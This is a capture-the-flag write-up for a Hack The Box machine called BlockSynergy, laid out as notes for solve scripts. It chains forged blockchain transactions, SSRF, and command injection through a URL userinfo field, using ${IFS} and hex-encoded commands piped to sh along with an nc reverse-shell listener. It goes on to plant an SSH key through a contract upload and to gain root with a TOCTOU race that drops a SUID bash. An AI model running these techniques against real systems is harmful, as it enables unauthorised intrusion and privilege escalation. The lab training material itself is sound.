# BlockSynergy scripts

All of this assumes HTB VPN (`tun0`) and a target you are allowed to hit.

## 1. Foothold — `walter`

```bash
nc -lvnp 4444
python3 exploit.py <TARGET_IP> <TUN0_IP> 4444
```

`exploit.py` creates a wallet, forges `Blockchain_Reward` transactions (`receiver`, not `recipient`), mines until VIP, then:

1. Registers **A** — `http://x;<cmd>;a@0.0.0.0:8080/`
2. Registers **B** — `http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=<urlencoded A>`
3. `GET /dashboard/vip/nodes/test_node/<index of B>` — the box `requests.get`s B, so **localhost GET** hits the ping handler.

Payload constraints (userinfo / netloc):

- **No `/`** — it ends netloc; registration fails.
- **No spaces** — use `${IFS}`.
- **No extra `:` in userinfo** — urlparse treats it as port.
- Commands with `/` (revshell, paths): `echo${IFS}<hex>|xxd${IFS}-r${IFS}-p|sh`.

Proof: `id` output in the admin `<pre>` next to node A.

## 2. Lateral — `hank`

On **Kali**:

```bash
ssh-keygen -t ed25519 -f hank_key -N ""
python3 plant_hank.py hank_key.pub > /tmp/contract.json
```

On **walter** (reverse shell or hex-wrap a script):

```bash
# copy contract.json onto the box, then:
curl -s -c /tmp/cj -b /tmp/cj -F "action=upload_contract" \
  -F "contract_file=@/tmp/contract.json;type=application/json" \
  http://127.0.0.1:5000/dashboard

curl -s -c /tmp/cj -b /tmp/cj -d "action=contract_claim" \
  http://127.0.0.1:5000/dashboard
```

`:5000` is **localhost-only**. The public VIP page `/dashboard/vip/smart_contracts` is a stub (“Coming soon”).

Then:

```bash
ssh -i hank_key hank@<TARGET_IP>
```

## 3. Root — restore TOCTOU

On **hank** (`developers`, rwx on `/opt/blocksynergy` and `/var/restore_work`):

```bash
bash make_suid_tar.sh   # writes /var/restore_work/restore_suid.tar.gz
# verify: tar -tvzf …  →  -rwsr-xr-x root/root … opt/blocksynergy/.diag

python3 race_watcher.py &    # watch BEFORE touch
touch /opt/blocksynergy/restore
```

Wait for `[+] swapped!`. Daemon period is on the order of minutes; if `restore` disappeared and there was no swap, `touch` again. Payload and `/var/restore_work` **must be the same filesystem** (`rename` atomic, no `EXDEV`).

```bash
ls -l /opt/blocksynergy/.diag
/opt/blocksynergy/.diag -p
# euid=0. Omit -p and bash drops privileges.
```

## Gotchas from the live solve

- `test_node` is **always GET**. POST/PUT/PATCH from Kali does not change the outbound method. Do not spend time on gopher / 307-to-POST.
- Admin `/admin/nodes/manage` from Kali is **403**. The ping GET only works **because SSRF runs as localhost**.
- Hash of a block: `sha256(str(index)+str(previous_hash)+str(timestamp)+json.dumps(data)+str(nonce))`. Difficulty prefix `00000`. Timestamp **UTC** and **after** the last block. Put **your** forged TX in the first five (other players’ pending TX would otherwise win FIFO).
- Transaction field is **`receiver`**. Using `recipient` lands on chain and later `KeyError: 'receiver'` (VIP templates 500).
- Do not 307 `test_node` onto `:8080/admin/nodes/manage` without query — single-thread Flask can deadlock on self-GET loops.
- `GET /nodes` is the **global** node list; `test_node/<i>` indexes that list. The list is flushed periodically — `exploit.py` retries.
- VIP `download_app` / `download_blockchain` = “Currently unavailable”.
